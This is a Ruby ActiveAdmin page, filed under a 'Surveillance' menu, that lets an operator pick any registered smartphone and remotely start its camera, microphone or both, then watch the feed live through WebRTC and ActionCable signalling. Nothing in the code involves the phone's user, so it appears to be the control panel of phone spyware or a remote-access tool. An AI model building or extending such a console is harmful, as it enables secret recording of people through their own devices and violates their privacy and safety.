ActiveAdmin.register_page "Live Streaming" do
  menu priority: 1, label: "🔴 Live Stream", parent: "👁 Surveillance"

  content do
    smartphones = Smartphone.all

    panel "Live Camera & Microphone Streaming" do
      div class: "streaming-container" do
        div class: "device-selector" do
          h4 "Select Device"
          select id: "stream-device-select", class: "streaming-select" do
            option "-- Select Device --", value: ""
            smartphones.each do |phone|
              option "#{phone.name} (ID: #{phone.id})", value: phone.id
            end
          end
        end

        div class: "stream-controls", style: "margin-top: 20px;" do
          button "📹 Start Camera", id: "btn-start-camera", class: "stream-btn camera-btn", disabled: true
          button "🎤 Start Microphone", id: "btn-start-mic", class: "stream-btn mic-btn", disabled: true
          button "📹🎤 Start Both", id: "btn-start-both", class: "stream-btn both-btn", disabled: true
          button "⏹️ Stop Stream", id: "btn-stop-stream", class: "stream-btn stop-btn", disabled: true, style: "background: #f85149;"
        end

        div class: "stream-viewer", style: "margin-top: 30px; text-align: center;" do
          video id: "remote-video", autoplay: true, playsinline: true, 
                style: "width: 640px; height: 480px; background: #0d1117; border: 2px solid #00ff00; border-radius: 10px;"
          para id: "stream-status", style: "color: #8b949e; margin-top: 10px;" do
            "Status: Disconnected"
          end
        end
      end
    end

    # JavaScript for WebRTC
    script do
      raw <<-JS
        document.addEventListener('DOMContentLoaded', function() {
          const deviceSelect = document.getElementById('stream-device-select');
          const btnCamera = document.getElementById('btn-start-camera');
          const btnMic = document.getElementById('btn-start-mic');
          const btnBoth = document.getElementById('btn-start-both');
          const btnStop = document.getElementById('btn-stop-stream');
          const remoteVideo = document.getElementById('remote-video');
          const statusEl = document.getElementById('stream-status');

          if (!deviceSelect || !btnCamera) { console.warn('Live streaming: DOM elements missing'); return; }

          let peerConnection = null;
          let cable = null;
          let streamingChannel = null;
          let currentDeviceId = null;

          // Enable buttons when device selected
          deviceSelect.addEventListener('change', function() {
            const hasDevice = this.value !== '';
            if (btnCamera) btnCamera.disabled = !hasDevice;
            if (btnMic) btnMic.disabled = !hasDevice;
            if (btnBoth) btnBoth.disabled = !hasDevice;
            currentDeviceId = this.value;
          });

          // Initialize ActionCable
          function connectCable(deviceId) {
            if (typeof ActionCable === 'undefined') {
              console.error('ActionCable is not loaded');
              if (statusEl) statusEl.textContent = 'Error: ActionCable not available';
              return;
            }
            cable = ActionCable.createConsumer();
            streamingChannel = cable.subscriptions.create(
              { channel: 'StreamingChannel', device_id: deviceId },
              {
                connected() {
                  if (statusEl) statusEl.textContent = 'Status: Connected to signaling server';
                  console.log('Connected to StreamingChannel');
                },
                disconnected() {
                  if (statusEl) statusEl.textContent = 'Status: Disconnected';
                },
                received(data) {
                  handleSignalingMessage(data);
                }
              }
            );
          }

          // Handle signaling messages
          async function handleSignalingMessage(data) {
            if (data.type === 'offer') {
              if (statusEl) statusEl.textContent = 'Status: Receiving stream...';
              await peerConnection.setRemoteDescription(new RTCSessionDescription({ type: 'offer', sdp: data.sdp }));
              const answer = await peerConnection.createAnswer();
              await peerConnection.setLocalDescription(answer);
              streamingChannel.perform('answer', { sdp: answer.sdp });
            } else if (data.type === 'ice_candidate' && data.candidate) {
              await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
            }
          }

          // Create peer connection
          async function createPeerConnection() {
            const config = await fetch('/webrtc/turn_credentials').then(r => r.json());
            peerConnection = new RTCPeerConnection(config);

            peerConnection.ontrack = function(event) {
              if (statusEl) statusEl.textContent = 'Status: 🔴 LIVE';
              if (remoteVideo) remoteVideo.srcObject = event.streams[0];
            };

            peerConnection.onicecandidate = function(event) {
              if (event.candidate) {
                streamingChannel.perform('ice_candidate', { 
                  candidate: event.candidate,
                  target: 'device'
                });
              }
            };

            peerConnection.onconnectionstatechange = function() {
              if (statusEl) statusEl.textContent = 'Status: ' + peerConnection.connectionState;
            };
          }

          // Start stream
          async function startStream(type) {
            if (!currentDeviceId) return;
            
            connectCable(currentDeviceId);
            await createPeerConnection();
            
            // Tell device to start streaming
            setTimeout(() => {
              if (streamingChannel) streamingChannel.perform('start_stream', { stream_type: type });
              if (btnStop) btnStop.disabled = false;
              if (btnCamera) btnCamera.disabled = true;
              if (btnMic) btnMic.disabled = true;
              if (btnBoth) btnBoth.disabled = true;
            }, 1000);
          }

          // Stop stream
          function stopStream() {
            if (streamingChannel) {
              streamingChannel.perform('stop_stream', {});
            }
            if (peerConnection) {
              peerConnection.close();
              peerConnection = null;
            }
            if (cable) {
              cable.disconnect();
            }
            if (remoteVideo) remoteVideo.srcObject = null;
            if (statusEl) statusEl.textContent = 'Status: Disconnected';
            if (btnStop) btnStop.disabled = true;
            if (btnCamera) btnCamera.disabled = false;
            if (btnMic) btnMic.disabled = false;
            if (btnBoth) btnBoth.disabled = false;
          }

          if (btnCamera) btnCamera.addEventListener('click', () => startStream('camera'));
          if (btnMic) btnMic.addEventListener('click', () => startStream('microphone'));
          if (btnBoth) btnBoth.addEventListener('click', () => startStream('both'));
          if (btnStop) btnStop.addEventListener('click', stopStream);
        });
      JS
    end
  end
end
